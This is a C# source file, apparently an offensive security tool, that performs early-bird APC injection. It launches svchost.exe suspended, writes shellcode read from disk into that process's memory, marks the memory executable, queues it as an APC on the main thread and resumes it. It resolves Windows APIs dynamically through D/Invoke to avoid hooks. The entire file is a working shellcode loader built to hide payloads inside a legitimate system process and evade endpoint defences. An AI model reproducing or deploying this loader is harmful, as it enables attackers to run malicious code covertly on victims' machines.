using System;
using System.IO;
using System.Runtime.InteropServices;
using static APCInjection.Imports.Imports;

namespace APCInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            string app = @"C:\Windows\System32\svchost.exe";
            IntPtr createProc = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(createProc, typeof(CreateProcess)) as CreateProcess;
            bool success = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);

            byte[] safe = File.ReadAllBytes(@"C:\Path\To\\shellcode.bin");
            IntPtr regionBits = new IntPtr(Convert.ToUInt32(safe.Length));
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr result = DInvoke.DynamicInvoke.Native.NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionBits, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, DInvoke.Data.Win32.WinNT.PAGE_READWRITE);

            var buf = Marshal.AllocHGlobal(safe.Length);
            Marshal.Copy(safe, 0, buf, safe.Length);
            IntPtr bytesWritten = IntPtr.Zero;
            uint resultBool = DInvoke.DynamicInvoke.Native.NtWriteVirtualMemory(pi.hProcess, result, buf, (uint)safe.Length);

            IntPtr proc_handle = pi.hProcess;
            resultBool = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(proc_handle, ref baseAddr, ref regionBits, DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READ);

            IntPtr queueUserAPCptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(queueUserAPCptr, typeof(QueueUserAPC)) as QueueUserAPC;
            queueUserAPC(result, pi.hThread, IntPtr.Zero);

            IntPtr resumeThreadptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "ResumeThread");
            ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(resumeThreadptr, typeof(ResumeThread)) as ResumeThread;
            resumeThread(pi.hThread);
        }
    }
}
